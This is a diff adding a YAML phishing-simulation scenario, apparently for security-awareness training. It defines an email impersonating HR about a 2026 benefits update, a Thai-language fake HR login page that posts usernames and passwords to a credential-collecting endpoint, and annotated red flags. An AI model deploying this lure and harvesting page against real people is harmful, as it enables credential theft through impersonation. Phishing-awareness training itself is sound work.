@@ -1,0 +1,66 @@
+name: hr_benefits_update
+description: >-
+  Impersonate the HR department to trick employees into providing their
+  internal credentials by claiming there is an update to employee benefits.
+components:
+- kind: email
+  name: hr_email
+  subject: "[NEW] Employee Benefits and Bonus Structure Update 2026"
+  email_template: |
+    Dear { attack.target.name },
+
+    The Human Resources Department has updated the employee benefits package
+    and bonus structure for the fiscal year 2026.
+
+    Please review the changes and confirm your benefits selection by clicking
+    the link below:
+
+    { attack.scheme.components.find_first(kind = html).url }
+
+    Regards,
+    HR Department
+  red_flags:
+  - kind: urgency
+    name: curiosity_bait
+    explanation: "The email uses '[NEW]' in the subject to pique curiosity and lure the user into clicking quickly."
+  - kind: mismatched_sender
+    name: mismatched_sender
+    explanation: "The sender's display name says 'HR' but the email address is external."
+
+- kind: html
+  name: hr_login
+  url: internal/hr-portal
+  title: "Employee Self-Service Portal"
+  html_template: |
+    <!DOCTYPE html>
+    <html lang="th">
+    <head>
+      <meta charset="UTF-8">
+      <title>ระบบสวัสดิการพนักงาน - HR Portal</title>
+      <style>
+        body { font-family: 'Sarabun', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 350px; }
+        h2 { color: #2c3e50; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #3498db; border: none; color: white; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #2980b9; }
+      </style>
+    </head>
+    <body>
+      <div class="login-card">
+        <h2>เข้าสู่ระบบ HR Portal</h2>
+        <p style="font-size: 0.9em; color: #666; text-align: center;">โปรดใช้รหัสพนักงานและรหัสผ่านเพื่อดูโบนัสสวัสดิการ</p>
+        <form id="hrLoginForm" method="post" action="{ attack.scheme.components.get_by_name("hr_data_receiver").url }">
+          <input type="text" id="employeeId" name="username" placeholder="รหัสพนักงาน" required>
+          <input type="password" id="password" name="password" placeholder="รหัสผ่าน" required>
+          <button type="submit">ดูโบนัสสวัสดิการปี 2026</button>
+        </form>
+      </div>
+    </body>
+    </html>
+
+- kind: api
+  name: hr_data_receiver
+  url: api/hr/collect
+  method: POST
+  description: "Endpoint to collect captured HR portal credentials"
